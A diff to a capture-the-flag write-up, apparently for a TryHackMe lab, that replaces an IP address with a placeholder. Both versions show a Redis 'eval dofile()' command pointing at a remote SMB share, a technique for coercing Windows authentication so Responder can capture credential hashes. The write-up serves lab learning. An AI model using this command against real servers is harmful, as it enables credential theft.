@@ -315,8 +315,8 @@ vulnnet.thm:6379> eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\
 <h2>Redis</h2>
 
 ```bash
-vulnnet.thm:6379> eval "dofile('//10.201.73.53/share')" 0
-(error) ERR Error running script (call to f_32380ab635d6cb342773862d8d86a17e07226ad8): @user_script:1: cannot open //10.201.73.53/share: Permission denied 
+vulnnet.thm:6379> eval "dofile('//xx.xxx.xx.xx/share')" 0
+(error) ERR Error running script (call to f_32380ab635d6cb342773862d8d86a17e07226ad8): @user_script:1: cannot open //xx.xxx.xx.xx/share: Permission denied 
 ```
 
 <h2>Responder</h2>
